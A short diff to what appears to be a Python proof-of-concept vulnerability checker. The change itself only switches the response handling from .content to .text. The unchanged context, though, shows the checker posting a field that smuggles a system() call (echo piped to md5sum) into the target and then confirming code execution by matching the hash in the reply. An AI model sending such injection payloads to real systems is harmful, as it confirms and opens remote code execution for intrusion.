@@ -53,7 +53,7 @@ class Poc(ABPoc):
                 verify_url = self.target + f
                 command = {
                     'object': '''1;system('echo -n "beebeeto"|md5sum;');exit''', }
-                content = requests.post(verify_url, data=command).content
+                content = requests.post(verify_url, data=command).text
                 if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
